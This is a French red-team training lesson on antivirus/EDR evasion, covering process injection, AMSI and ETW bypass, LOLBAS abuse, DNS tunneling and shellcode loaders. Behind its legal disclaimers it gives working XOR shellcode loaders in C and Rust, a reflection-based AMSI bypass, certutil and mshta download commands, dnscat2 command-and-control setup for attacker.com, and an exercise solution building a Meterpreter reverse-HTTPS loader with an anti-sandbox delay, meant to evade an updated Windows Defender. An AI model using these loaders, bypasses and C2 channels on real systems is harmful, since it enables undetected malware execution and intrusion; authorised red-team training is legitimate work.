---
tags:
  - Cybersécurité
  - Avancé
  - Pratique
description: "Évasion AV/EDR, développement de loaders offensifs, AMSI/ETW bypass, LOLBAS et évasion réseau"
estimated_time: "60 min"
fiche_number: 2
total_fiches: 4
cursus: "Phase 7 - Red Team Avancé"
id: "security.cybersecurity.red-team.evasion-outils-offensifs"
course_id: "security.cybersecurity"
module_id: "security.cybersecurity.red-team"
content_type: "lesson"
order: 2
---

# 02 - Évasion et Développement d'outils offensifs

> **En bref** : Cette fiche décrit, dans un cadre **défensif et de laboratoire autorisé**, les grandes familles de techniques d'évasion AV/EDR et leurs contre-mesures. Lire n'équivaut pas à une compétence opérationnelle de red team. Lecture estimée : 60 min.

!!! danger "Cadre légal et éthique (obligatoire)"
    Les techniques décrites ici ne doivent être pratiquées **que** sur des systèmes que tu possèdes ou pour lesquels tu as une autorisation écrite (contrat de pentest, lab CTF, machine d'entraînement isolée). En France, l'accès frauduleux à un système automatisé de données est un délit (code pénal, art. 323-1 et s.). Ce wiki n'est **pas** une autorisation, ni une formation certifiante d'opérateur offensif.

## Prérequis

- [Red Team Operations](01-red-team-operations.md) (fiche 01 de cette phase)
- [Programmation et scripting](../01-fondamentaux-informatiques/04-programmation-scripting.md) (Phase 1, fiche 04)
- Connaissances en C/C++ : compilation, pointeurs, gestion mémoire
- Compréhension du fonctionnement de Windows : processus, DLLs, API Win32
- Familiarité conceptuelle avec un framework C2 (Sliver, Cobalt Strike ou Mythic) - usage lab uniquement

## Objectif de cette fiche

À la fin de cette fiche, tu pourras **expliquer** les mécanismes d'évasion AV/EDR (obfuscation, injection, contournements AMSI/ETW, LOLBAS, canaux C2), **reconnaître** ces patterns côté défense, et situer le domain fronting comme technique **historique / contrainte** (souvent bloquée sur les grands CDN modernes). Tu ne deviendras pas « capable de contourner les EDR modernes en production » par la seule lecture.

---

## Concepts

Cette section explique tous les concepts nécessaires. Lis-la entièrement avant de passer aux étapes pratiques.

### Qu'est-ce que l'évasion AV/EDR ?

**Définition** : L'évasion AV/EDR regroupe les techniques qui permettent d'exécuter du code malveillant sans être détecté par les logiciels de sécurité (antivirus et Endpoint Détection and Response). L'objectif est de contourner les mécanismes de détection statique (signatures) et dynamique (comportemental).

**Le problème que l'évasion résout** :

Sans techniques d'évasion, voici les problèmes rencontrés :

1. **Détection par signatures** : les outils connus (Mimikatz, Cobalt Strike) sont immédiatement détectés par leur empreinte binaire
2. **Détection comportementale** : l'EDR surveille les appels système (syscalls) et détecte les patterns suspects (injection de code, dump de mémoire LSASS)
3. **Blocage de l'exécution** : AMSI (Antimalware Scan Interface) analyse les scripts PowerShell et .NET en mémoire avant leur exécution

**Comment l'évasion résout ces problèmes** :

| Problème | Solution |
| -------- | -------- |
| Détection par signatures | Obfuscation du payload : chiffrement, encodage, compilation personnalisée |
| Détection comportementale | Injection de processus légitime, syscalls directs, unhooking |
| Blocage AMSI | Patching de la fonction `AmsiScanBuffer` en mémoire |

**Analogie concrète** : Passer la sécurité d'un aéroport avec un objet interdit. La détection par signature est le scanner à rayons X (il reconnaît la forme d'un couteau). La détection comportementale est l'agent de sécurité qui observe ton comportement suspect. L'évasion consiste à démonter l'objet en pièces inoffensives qui passent le scanner, puis à le réassembler de l'autre côté.

**Ce que l'évasion n'est PAS** :

- L'évasion n'est pas une désactivation de l'antivirus. Désactiver l'AV nécessite déjà des droits administrateur. L'évasion permet d'exécuter du code _malgré_ l'AV actif.
- L'évasion n'est pas permanente. Les éditeurs d'AV/EDR mettent à jour leurs signatures régulièrement. Un bypass qui fonctionne aujourd'hui peut être détecté demain.

---

### Qu'est-ce que l'injection de processus ?

**Définition** : L'injection de processus est une technique qui consiste à exécuter du code dans l'espace mémoire d'un autre processus. Le code malveillant s'exécute sous l'identité du processus cible, ce qui rend la détection plus difficile.

**Le problème que l'injection de processus résout** :

Sans injection de processus, voici les problèmes rencontrés :

1. **Processus suspect** : un exécutable inconnu qui apparaît dans la liste des processus attire l'attention
2. **Pas de contexte de confiance** : un programme inconnu n'a pas les permissions ou la légitimité d'un programme système
3. **Détection facile** : l'EDR surveille les nouveaux processus et peut les bloquer

**Comment l'injection de processus résout ces problèmes** :

| Problème | Solution |
| -------- | -------- |
| Processus suspect | Le code s'exécute dans un processus légitime (explorer.exe, svchost.exe) |
| Pas de contexte de confiance | Le processus hôte possède déjà les permissions nécessaires |
| Détection facile | Pas de nouveau processus créé, le code est invisible dans la liste des tâches |

**Techniques d'injection principales** :

| Technique | Description | Niveau de détection |
| --------- | ----------- | ------------------- |
| DLL Injection | Forcer un processus à charger une DLL malveillante via `LoadLibrary` | Élevé (très surveillé) |
| Shellcode Injection | Allouer de la mémoire dans un processus distant et y copier du shellcode | Moyen |
| Process Hollowing | Créer un processus en état suspendu, remplacer son code par le payload, puis le reprendre | Moyen à Élevé |
| Process Doppelgänging | Utiliser les transactions NTFS pour créer un processus à partir d'un fichier temporaire | Faible (complexe) |
| Thread Hijacking | Détourner un thread existant d'un processus pour exécuter du code | Moyen |
| APC Injection | Injecter du code via les Asynchronous Procédure Calls | Moyen |

**Process Hollowing en détail** :

Le process hollowing fonctionne en 5 étapes :

1. **Créer un processus légitime** en état suspendu (`CREATE_SUSPENDED`)
2. **Démapper** (unmap) le code original du processus
3. **Allouer** de la mémoire dans le processus pour le payload
4. **Écrire** le payload (shellcode ou PE) dans la mémoire allouée
5. **Reprendre** (resume) le thread principal du processus

Le processus apparaît comme légitime dans le Gestionnaire des tâches, mais il exécute le code de l'attaquant.

---

### Qu'est-ce que l'AMSI ?

**Définition** : AMSI (Antimalware Scan Interface) est une interface Windows qui permet aux applications d'envoyer du contenu à l'antivirus pour analyse avant exécution. PowerShell, .NET, VBScript et JavaScript utilisent AMSI pour scanner le code en mémoire.

**Le problème que l'AMSI résout (du point de vue défensif)** :

1. **Scripts obfusqués** : un script PowerShell encodé en Base64 échappe à l'analyse statique des fichiers
2. **Exécution en mémoire** : le code chargé en mémoire (fileless malware) n'est jamais écrit sur le disque
3. **Contenu dynamique** : le code téléchargé et exécuté à la volée n'est pas analysé par les AV classiques

**Comment bypasser AMSI** :

L'AMSI fonctionne via la DLL `amsi.dll` chargée dans chaque processus PowerShell ou .NET. La fonction clé est `AmsiScanBuffer`. Si cette fonction est patchée pour toujours retourner "clean" (pas de menace), tout le code est exécuté sans analyse.

**Méthodes de bypass** :

| Méthode | Description | Fiabilité |
| ------- | ----------- | --------- |
| Patching `AmsiScanBuffer` | Écrire des instructions de retour dans la fonction en mémoire | Élevée |
| Patching `AmsiInitialize` | Empêcher l'initialisation d'AMSI dans le processus | Élevée |
| Réflexion .NET | Modifier le champ `amsiInitFailed` via la réflexion | Moyenne |
| Obfuscation du bypass | Encoder ou obfusquer le code de bypass lui-même | Variable |

---

### Qu'est-ce que l'ETW ?

**Définition** : ETW (Event Tracing for Windows) est le système de traçage d'événements de Windows. Il permet aux applications et au système de générer des événements que les outils de sécurité (EDR) consomment pour détecter les activités suspectes.

**Le problème que le patching ETW résout (du point de vue offensif)** :

1. **Visibilité de l'EDR** : l'EDR utilise ETW pour surveiller les appels .NET, les chargements de DLL et les exécutions de scripts
2. **Logs détaillés** : chaque commande PowerShell, chaque assembly .NET chargée en mémoire est enregistrée
3. **Alertes en temps réel** : les providers ETW alimentent les règles de détection de l'EDR

**Comment le patching ETW fonctionne** :

Le patching ETW consiste à modifier la fonction `EtwEventWrite` (dans `ntdll.dll`) pour qu'elle ne fasse rien. Les événements ne sont plus générés et l'EDR perd la visibilité sur ces activités.

---

### Qu'est-ce que LOLBAS ?

**Définition** : LOLBAS (Living Off the Land Binaries And Scripts) désigne les binaires, scripts et bibliothèques légitimes de Windows qui peuvent être détournés pour exécuter du code, télécharger des fichiers ou contourner les contrôles de sécurité.

**Le problème que LOLBAS résout** :

Sans LOLBAS, voici les problèmes rencontrés :

1. **Besoin de déposer des outils** : l'attaquant doit transférer ses outils sur la machine cible, ce qui déclenche des alertes
2. **Blocage des exécutables inconnus** : les politiques de contrôle d'applications (AppLocker, WDAC) bloquent les exécutables non autorisés
3. **Détection par hash** : les outils offensifs connus sont identifiés par leur empreinte

**Comment LOLBAS résout ces problèmes** :

| Problème | Solution |
| -------- | -------- |
| Besoin de déposer des outils | Utiliser des outils déjà présents sur le système |
| Blocage des exécutables | Les binaires Microsoft signés sont toujours autorisés |
| Détection par hash | Les binaires légitimes ont des hash connus et approuvés |

**Exemples de binaires LOLBAS courants** :

| Binaire | Capacité | Exemple d'utilisation |
| ------- | -------- | --------------------- |
| `certutil.exe` | Téléchargement de fichiers | `certutil -urlcache -split -f http://URL fichier.exe` |
| `mshta.exe` | Exécution de code HTA/JS | `mshta http://URL/payload.hta` |
| `rundll32.exe` | Chargement de DLL | `rundll32 shell32.dll,ShellExec_RunDLL payload.exe` |
| `regsvr32.exe` | Exécution de scriptlets COM | `regsvr32 /s /n /u /i:http://URL scrobj.dll` |
| `bitsadmin.exe` | Téléchargement en arrière-plan | `bitsadmin /transfer job /download http://URL fichier.exe` |
| `msbuild.exe` | Exécution de code C# inline | `msbuild payload.csproj` |
| `wmic.exe` | Exécution de processus | `wmic process call create "payload.exe"` |
| `cscript.exe` | Exécution de scripts VBS/JS | `cscript payload.vbs` |

**Analogie concrète** : LOLBAS est comme utiliser les outils d'un propriétaire pour forcer sa propre serrure. Au lieu d'apporter un pied-de-biche (outil offensif détectable), tu utilises le tournevis et le marteau qui sont dans le garage (binaires système signés par Microsoft).

**Ce que LOLBAS n'est PAS** :

- LOLBAS n'est pas un exploit. Les binaires ne sont pas vulnérables. Ils fonctionnent exactement comme prévu par Microsoft. C'est leur usage légitime qui est détourné.
- LOLBAS n'est pas invisible. Les EDR modernes surveillent l'utilisation suspecte de ces binaires (par exemple, `certutil` qui télécharge un .exe).

---

### Qu'est-ce que l'évasion réseau ?

**Définition** : L'évasion réseau regroupe les techniques qui permettent de faire passer le trafic C2 sans être détecté par les dispositifs de surveillance réseau (IDS/IPS, proxy, firewall).

**Le problème que l'évasion réseau résout** :

Sans évasion réseau, voici les problèmes rencontrés :

1. **Trafic C2 identifiable** : les connexions vers des serveurs inconnus sur des ports inhabituels sont bloquées
2. **Inspection du contenu** : les proxies et IDS inspectent le contenu HTTP/HTTPS et détectent les patterns C2
3. **Analyse DNS** : les requêtes DNS vers des domaines suspects ou avec des sous-domaines de plus de 63 caractères sont signalées

**Comment l'évasion réseau résout ces problèmes** :

| Problème | Solution |
| -------- | -------- |
| Trafic identifiable | Utiliser des ports et protocoles standard (443, 53, 80) |
| Inspection du contenu | Domain fronting, CDN abuse, chiffrement avec JA3 fingerprint modifié |
| Analyse DNS | DNS tunneling avec encodage et fragmentation des données |

**DNS Tunneling** :

Le DNS tunneling encode les données C2 dans les requêtes et réponses DNS :

```text
Données à envoyer : "commande: whoami"

1. L'implant encode les données en Base32 :
   MNQXIIDUNFXGO===

2. L'implant envoie une requête DNS :
   MNQXIIDUNFXGO.c2.attacker.com

3. Le serveur C2 autoritaire pour attacker.com
   reçoit la requête et décode les données

4. La réponse C2 est encodée dans un enregistrement TXT :
   TXT "MFXGS3DFON2GKMZSN52GS3TH" (= "nt authority\system")
```

**Staged vs Stageless payloads** :

| Staged | Stageless |
| ------ | --------- |
| L'implant initial est petit (stager) | L'implant complet est dans un seul fichier |
| Le stager télécharge le payload complet | Pas de téléchargement supplémentaire |
| Deux connexions réseau (détectables) | Une seule connexion |
| Fichier initial moins suspect | Fichier plus gros, potentiellement plus détectable |
| Utilisé quand la taille du fichier est limitée | Utilisé quand la furtivité réseau est prioritaire |

---

### Qu'est-ce qu'un loader ?

**Définition** : Un loader est un programme dont le seul objectif est de charger et exécuter un payload (du shellcode dans la majorité des cas) en mémoire. Le loader gère le déchiffrement du payload, l'allocation mémoire, et l'exécution, tout en évitant la détection.

**Le problème que les loaders résolvent** :

Sans loader personnalisé, voici les problèmes rencontrés :

1. **Payload détecté** : le shellcode brut est immédiatement identifié par l'AV
2. **Exécution directe bloquée** : Windows bloque l'exécution de fichiers suspects
3. **Manque de flexibilité** : les outils standard (msfvenom) génèrent des payloads avec des signatures connues

**Comment les loaders résolvent ces problèmes** :

| Problème | Solution |
| -------- | -------- |
| Payload détecté | Le shellcode est chiffré (AES, XOR) et déchiffré uniquement en mémoire |
| Exécution directe bloquée | Le loader est un programme légitime en apparence (signé, icône, métadonnées) |
| Manque de flexibilité | Le loader est écrit sur mesure, avec une empreinte unique |

**Langages pour développer des loaders** :

| Langage | Avantages | Inconvénients |
| ------- | --------- | ------------- |
| C/C++ | Accès direct à l'API Win32, taille réduite, performance | Développement plus long, gestion mémoire manuelle |
| Rust | Sécurité mémoire, peu de signatures AV, compilation native | Courbe d'apprentissage, binaire plus gros |
| Nim | Syntaxe simple, compilation native, peu de signatures | Communauté plus petite, moins d'exemples |
| Go | Cross-compilation facile, bibliothèque standard riche | Binaire très gros (>5 Mo), runtime détectable |
| C# | Intégration Windows native, .NET reflection | Soumis à AMSI, nécessite .NET runtime |

---

## Étapes Pratiques

> **Cadre strict (lab uniquement)** : les exemples ci-dessous (loaders, chiffrement de shellcode, contournement AMSI/ETW) sont destinés à un **laboratoire autorisé** (VM isolée, engagement red team contractuel). Ils illustrent des mécanismes défensifs et offensifs pour comprendre la détection. **N'utilise pas** ces techniques contre des systèmes hors périmètre autorisé. Les payloads sont volontairement factices ou à remplacer uniquement dans ton lab.

### Étape 1 : Développer un loader de shellcode en C

Ce loader illustre le principe du déchiffrement XOR en mémoire avant exécution. Le tableau d'octets est **factice** ; ne le remplace par un vrai payload que dans un lab autorisé.

```c
// loader.c - Loader de shellcode XOR basique
// Compilation : x86_64-w64-mingw32-gcc loader.c -o loader.exe -lws2_32
#include <windows.h>
#include <stdio.h>

// Clé XOR pour déchiffrer le shellcode
unsigned char key[] = { 0x41, 0x42, 0x43, 0x44 };

// Shellcode chiffré avec XOR (remplacer par ton shellcode chiffré)
// Cet exemple utilise un shellcode factice
unsigned char encrypted_shellcode[] = {
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07
    // ... shellcode complet ici
};

// Fonction de déchiffrement XOR
void xor_decrypt(unsigned char* data, int data_len,
                 unsigned char* key_bytes, int key_len) {
    // Chaque octet du shellcode est XORé avec un octet de la clé
    // La clé est utilisée de manière cyclique
    for (int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ key_bytes[i % key_len];
    }
}

int main() {
    int shellcode_len = sizeof(encrypted_shellcode);

    // Étape 1 : Déchiffrer le shellcode en mémoire
    xor_decrypt(encrypted_shellcode, shellcode_len,
                key, sizeof(key));

    // Étape 2 : Allouer de la mémoire exécutable
    // VirtualAlloc crée une zone mémoire avec les permissions RWX
    void* exec_mem = VirtualAlloc(
        NULL,                  // Adresse choisie par le système
        shellcode_len,         // Taille de l'allocation
        MEM_COMMIT | MEM_RESERVE,  // Allouer et réserver la mémoire
        PAGE_EXECUTE_READWRITE     // Permissions : lecture + écriture + exécution
    );

    if (exec_mem == NULL) {
        return 1;  // Échec de l'allocation
    }

    // Étape 3 : Copier le shellcode déchiffré dans la mémoire allouée
    memcpy(exec_mem, encrypted_shellcode, shellcode_len);

    // Étape 4 : Créer un thread pour exécuter le shellcode
    HANDLE hThread = CreateThread(
        NULL,                    // Attributs de sécurité par défaut
        0,                       // Taille de pile par défaut
        (LPTHREAD_START_ROUTINE)exec_mem,  // Adresse du shellcode
        NULL,                    // Pas de paramètre
        0,                       // Démarrer immédiatement
        NULL                     // Pas besoin de l'ID du thread
    );

    // Étape 5 : Attendre que le thread se termine
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}
```

**Compilation** (depuis Linux avec MinGW, pour produire un exécutable Windows) :

```bash
# Installer le cross-compilateur MinGW
sudo apt install mingw-w64 -y

# Compiler le loader pour Windows 64 bits
x86_64-w64-mingw32-gcc loader.c -o loader.exe -lws2_32
```

**Résultat attendu** :

```text
# Pas de message d'erreur = compilation réussie
# Le fichier loader.exe est créé dans le répertoire courant
ls -la loader.exe
-rwxr-xr-x 1 user user 45056 Jan 15 10:30 loader.exe
```

---

### Étape 2 : Chiffrer un shellcode avec un script Python

```python
# encrypt_shellcode.py - Chiffre un shellcode avec XOR
import sys

# Clé XOR (doit correspondre à celle du loader)
key = bytearray([0x41, 0x42, 0x43, 0x44])

# Lire un blob binaire depuis un fichier (lab uniquement)
# Exemple pédagogique : générer un payload de test dans un lab isolé, par ex. :
#   msfvenom -p windows/x64/messagebox TEXT="lab" -f raw -o shellcode.bin
# Évite les reverse shells hors environnement explicitement autorisé.
with open("shellcode.bin", "rb") as f:
    shellcode = bytearray(f.read())

# Chiffrer avec XOR
encrypted = bytearray()
for i in range(len(shellcode)):
    encrypted.append(shellcode[i] ^ key[i % len(key)])

# Afficher en format C (tableau d'octets)
print("unsigned char encrypted_shellcode[] = {")
for i in range(0, len(encrypted), 12):
    # Afficher 12 octets par ligne
    line = ", ".join(f"0x{b:02x}" for b in encrypted[i:i+12])
    if i + 12 < len(encrypted):
        print(f"    {line},")
    else:
        print(f"    {line}")
print("};")
print(f"\n// Taille du shellcode : {len(encrypted)} octets")
```

```bash
# Générer un payload de démonstration (lab isolé uniquement)
msfvenom -p windows/x64/messagebox TEXT="lab-ok" -f raw -o shellcode.bin

# Chiffrer le blob pour l'intégrer dans le loader d'exemple
python3 encrypt_shellcode.py > encrypted_output.c
```

**Résultat attendu** :

```text
unsigned char encrypted_shellcode[] = {
    0xa9, 0x92, 0xc3, 0x44, 0x41, 0x42, 0x43, 0x44, 0x69, 0x53, 0xc2, 0xd5,
    0x6d, 0x53, 0xc2, 0xf5, 0x6d, 0x53, 0xc2, 0xcd, 0x6d, 0x53, 0xa2, 0x95
    // ... suite du shellcode chiffré
};

// Taille du shellcode : 510 octets
```

---

### Étape 3 : Bypasser AMSI en PowerShell

```powershell
# Méthode 1 : Patching AmsiScanBuffer via réflexion .NET
# Ce code modifie le champ interne qui indique si AMSI est initialisé
# Exécuter dans PowerShell (sur la machine cible)

# Étape 1 : Trouver le type AmsiUtils dans l'assembly System.Management.Automation
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')

# Étape 2 : Accéder au champ privé amsiInitFailed
$b = $a.GetField('amsiInitFailed','NonPublic,Static')

# Étape 3 : Mettre la valeur à True (AMSI croit qu'il a échoué à s'initialiser)
$b.SetValue($null,$true)
```

**Résultat attendu** :

```text
# Pas de sortie visible
# AMSI est maintenant désactivé pour cette session PowerShell
# Les commandes suivantes ne seront plus analysées par l'antivirus
```

**Note importante** : Ce bypass est bien connu des EDR. En environnement réel, il faut obfusquer le code de bypass lui-même (encodage, concaténation de chaînes, variables aléatoires).

---

### Étape 4 : Utiliser certutil pour le téléchargement LOLBAS

```powershell
# Télécharger un fichier en utilisant certutil (binaire Microsoft signé)
# certutil est un outil Windows prévu pour gérer les certificats
certutil -urlcache -split -f http://10.0.0.10/payload.exe C:\Windows\Temp\update.exe

# Variante : encoder/décoder en Base64 pour masquer le contenu
# Sur la machine attaquante, encoder le fichier
certutil -encode payload.exe payload.b64

# Sur la machine cible, décoder le fichier
certutil -decode payload.b64 payload.exe
```

**Résultat attendu** :

```text
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

---

### Étape 5 : Configurer un canal C2 via DNS tunneling avec dnscat2

```bash
# Sur le serveur C2 : installer dnscat2
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
gem install bundler
bundle install

# Démarrer le serveur dnscat2
# Remplacer attacker.com par ton domaine (avec un enregistrement NS pointant vers ton serveur)
ruby dnscat2.rb attacker.com
```

**Résultat attendu** :

```text
New window created: 0
dnscat2> Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = attacker.com]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following:
  ./dnscat --dns domain=attacker.com

dnscat2>
```

Sur la machine cible Windows, exécuter le client :

```powershell
# Le client dnscat2 communique via des requêtes DNS vers attacker.com
dnscat2-v0.07-client-win32.exe --dns domain=attacker.com
```

---

### Étape 6 : Développer un loader en Rust

Rust produit des binaires natifs avec très peu de signatures AV connues.

```rust
// src/main.rs - Loader de shellcode en Rust
// Compilation : cargo build --release --target x86_64-pc-windows-gnu
use std::ptr;

// Déclarations des fonctions API Windows
#[link(name = "kernel32")]
extern "system" {
    fn VirtualAlloc(
        lpAddress: *mut u8,
        dwSize: usize,
        flAllocationType: u32,
        flProtect: u32,
    ) -> *mut u8;

    fn CreateThread(
        lpThreadAttributes: *mut u8,
        dwStackSize: usize,
        lpStartAddress: *mut u8,
        lpParameter: *mut u8,
        dwCreationFlags: u32,
        lpThreadId: *mut u32,
    ) -> *mut u8;

    fn WaitForSingleObject(hHandle: *mut u8, dwMilliseconds: u32) -> u32;
}

// Constantes Windows
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;

fn main() {
    // Shellcode chiffré AES (remplacer par ton shellcode)
    let encrypted: Vec<u8> = vec![0x00; 512]; // Placeholder

    // Clé XOR
    let key: Vec<u8> = vec![0x41, 0x42, 0x43, 0x44];

    // Déchiffrer le shellcode
    let mut shellcode: Vec<u8> = encrypted
        .iter()
        .enumerate()
        .map(|(i, byte)| byte ^ key[i % key.len()])
        .collect();

    unsafe {
        // Allouer de la mémoire exécutable
        let exec_mem = VirtualAlloc(
            ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if exec_mem.is_null() {
            return;
        }

        // Copier le shellcode dans la mémoire allouée
        ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            exec_mem,
            shellcode.len(),
        );

        // Créer un thread pour exécuter le shellcode
        let h_thread = CreateThread(
            ptr::null_mut(),
            0,
            exec_mem,
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        );

        // Attendre la fin du thread
        WaitForSingleObject(h_thread, 0xFFFFFFFF);
    }
}
```

```bash
# Installer la cible de compilation Windows
rustup target add x86_64-pc-windows-gnu

# Compiler pour Windows
cargo build --release --target x86_64-pc-windows-gnu
```

**Résultat attendu** :

```text
   Compiling loader v0.1.0
    Finished release [optimized] target(s) in 2.34s
```

---

## Commandes Utiles

| Commande | Action |
| -------- | ------ |
| `msfvenom -p windows/x64/messagebox TEXT="lab" -f raw` | Exemple lab uniquement (pas de reverse shell hors périmètre autorisé) |
| `x86_64-w64-mingw32-gcc loader.c -o loader.exe` | Cross-compiler un loader C pour Windows |
| `cargo build --release --target x86_64-pc-windows-gnu` | Compiler un loader Rust pour Windows |
| `certutil -urlcache -split -f URL fichier` | Télécharger un fichier via LOLBAS |
| `mshta http://URL/payload.hta` | Exécuter du code via mshta (LOLBAS) |
| `rundll32 shell32.dll,ShellExec_RunDLL cmd` | Exécuter une commande via rundll32 |
| `ruby dnscat2.rb domaine.com` | Démarrer un serveur DNS tunneling |
| `Invoke-AtomicTest T1055` | Tester les techniques d'injection de processus |

---

## Pièges Fréquents

### Piège 1 : Allouer de la mémoire RWX directement

⚠️ **Problème** : Appeler `VirtualAlloc` avec `PAGE_EXECUTE_READWRITE` (RWX) est un signal d'alerte majeur pour les EDR. Très peu de programmes légitimes ont besoin de mémoire à la fois inscriptible et exécutable.

✅ **Solution** : Utiliser une approche en deux temps. D'abord allouer avec `PAGE_READWRITE` (RW), écrire le shellcode, puis changer les permissions en `PAGE_EXECUTE_READ` (RX) avec `VirtualProtect`. Cela réduit la fenêtre de détection.

```c
// Étape 1 : Allouer en lecture/écriture
void* mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
// Étape 2 : Écrire le shellcode
memcpy(mem, shellcode, size);
// Étape 3 : Changer en lecture/exécution
DWORD oldProtect;
VirtualProtect(mem, size, PAGE_EXECUTE_READ, &oldProtect);
```

---

### Piège 2 : Utiliser les mêmes techniques de bypass AMSI en boucle

⚠️ **Problème** : Copier-coller le même bypass AMSI depuis GitHub. Les éditeurs d'AV ajoutent les signatures des bypasses connus. Le code de bypass est lui-même détecté par AMSI.

✅ **Solution** : Toujours obfusquer le code de bypass. Utiliser la concaténation de chaînes, l'encodage Base64, les variables aléatoires. Écrire ton propre bypass en comprenant le mécanisme plutôt que de copier un code existant.

---

### Piège 3 : Ignorer le JA3 fingerprint

⚠️ **Problème** : Le trafic HTTPS du C2 a un fingerprint TLS (JA3) différent de celui des navigateurs légitimes. Les proxies et NIDS modernes comparent le JA3 du trafic entrant avec les fingerprints connus.

✅ **Solution** : Configurer le client TLS du C2 pour imiter le JA3 d'un navigateur légitime (Chrome, Firefox). Certains frameworks C2 (Sliver, Cobalt Strike) proposent cette option. Sinon, utiliser des bibliothèques TLS configurables.

---

### Piège 4 : Oublier que LOLBAS est surveillé par les EDR modernes

⚠️ **Problème** : Utiliser `certutil` pour télécharger un fichier en pensant que c'est invisible. Les EDR modernes génèrent des alertes sur l'usage suspect de `certutil`, `mshta`, `regsvr32` et d'autres binaires LOLBAS.

✅ **Solution** : Combiner LOLBAS avec d'autres techniques. Utiliser des binaires moins surveillés, chaîner les appels, ou utiliser des binaires LOLBAS récemment découverts qui ne sont pas encore dans les règles de détection. Consulter le site `lolbas-project.github.io` régulièrement.

---

### Piège 5 : Ne pas tester son payload avant l'opération

⚠️ **Problème** : Développer un loader et l'utiliser directement en opération sans le tester contre les AV/EDR du client. Le payload est détecté, l'opération est grillée.

✅ **Solution** : Tester le payload dans un lab avec le même AV/EDR que la cible (si connu). Utiliser des services comme antiscan.me (ne pas utiliser VirusTotal qui partage les échantillons avec les éditeurs). Préparer plusieurs variantes du payload.

---

## Checklist de Validation

- [ ] Je comprends la différence entre détection statique (signatures) et dynamique (comportementale)
- [ ] Je sais expliquer le process hollowing et ses 5 étapes
- [ ] Je peux expliquer un bypass AMSI et comment un défenseur le détecte (sans l'utiliser hors lab)
- [ ] Je comprends le rôle d'ETW et pourquoi le patcher aide l'évasion
- [ ] Je connais au moins 5 binaires LOLBAS et leur utilisation offensive
- [ ] Je sais développer un loader de shellcode en C avec chiffrement XOR
- [ ] Je comprends la différence entre staged et stageless payloads
- [ ] Je sais configurer un canal C2 via DNS tunneling
- [ ] J'ai compilé un loader avec MinGW pour Windows
- [ ] Je comprends pourquoi l'allocation mémoire RWX est détectable

---

## Exercice Pratique

**Énoncé** : Développe un loader de shellcode en C qui contourne un antivirus basique. Le loader doit chiffrer le shellcode, le déchiffrer en mémoire, et l'exécuter via injection dans un processus légitime.

**Indications** :

- Génère un shellcode Sliver ou Metasploit (reverse HTTPS)
- Chiffre le shellcode avec le script Python fourni (XOR)
- Intègre le shellcode chiffré dans le loader C
- Utilise la technique RW -> RX (pas de RWX direct)
- Compile avec MinGW pour Windows
- Teste sur une VM Windows avec Windows Defender activé
- Si le loader est détecté, identifie ce qui déclenche la détection et modifie le code

**Résultat attendu** : Un loader fonctionnel qui exécute un reverse shell sans déclencher d'alerte antivirus sur Windows Defender à jour.

---

## Solution de l'Exercice

> **Note** : Cette section contient la solution complète. Essaie d'abord de résoudre l'exercice par toi-même avant de consulter cette solution.

---

**Étape 1 : Générer le shellcode**

```bash
# Générer un shellcode Sliver ou Metasploit
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=10.0.0.10 LPORT=443 \
  -f raw -o shellcode.bin

# Chiffrer avec le script Python
python3 encrypt_shellcode.py > encrypted_payload.h
```

**Étape 2 : Écrire le loader amélioré**

```c
// loader_v2.c - Loader avec techniques d'évasion
#include <windows.h>
#include <stdio.h>

// Inclure le shellcode chiffré généré par le script Python
// #include "encrypted_payload.h"

// Shellcode chiffré (placeholder - remplacer par le contenu de encrypted_payload.h)
unsigned char enc_sc[] = { /* ... */ };
unsigned char key[] = { 0x41, 0x42, 0x43, 0x44 };

// Déchiffrement XOR
void decrypt(unsigned char* data, int len, unsigned char* k, int klen) {
    for (int i = 0; i < len; i++) {
        data[i] ^= k[i % klen];
    }
}

int main() {
    int sc_len = sizeof(enc_sc);

    // Technique anti-sandbox : attendre 10 secondes
    // Les sandboxes AV ont un timeout court
    Sleep(10000);

    // Déchiffrer le shellcode
    decrypt(enc_sc, sc_len, key, sizeof(key));

    // Allouer en RW (pas RWX)
    void* mem = VirtualAlloc(NULL, sc_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return 1;

    // Copier le shellcode
    memcpy(mem, enc_sc, sc_len);

    // Changer les permissions en RX
    DWORD old;
    VirtualProtect(mem, sc_len, PAGE_EXECUTE_READ, &old);

    // Exécuter via CreateThread
    HANDLE ht = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    WaitForSingleObject(ht, INFINITE);

    return 0;
}
```

**Étape 3 : Compiler**

```bash
# Compiler avec MinGW
x86_64-w64-mingw32-gcc loader_v2.c -o loader_v2.exe -lws2_32

# Vérifier la taille du binaire
ls -la loader_v2.exe
```

**Étape 4 : Tester**

```bash
# Transférer le loader vers la VM Windows
# Option 1 : serveur HTTP simple
python3 -m http.server 8080

# Sur la VM Windows (PowerShell), télécharger et exécuter
# Invoke-WebRequest http://10.0.0.10:8080/loader_v2.exe -OutFile loader_v2.exe
# .\loader_v2.exe
```

**Si le loader est détecté** :

1. Vérifie quel composant déclenche la détection (signature du binaire, comportement à l'exécution, trafic réseau)
2. Ajoute du code légitime (GUI, fonctions utilitaires) pour modifier l'empreinte du binaire
3. Change le chiffrement (passer de XOR à AES-256)
4. Utilise des API moins surveillées (NtAllocateVirtualMemory au lieu de VirtualAlloc)
5. Ajoute des techniques anti-sandbox supplémentaires (vérification du nombre de CPU, de la RAM, des noms de processus)

---

## Navigation

← Fiche précédente : **[01 - Red Team Operations](01-red-team-operations.md)**

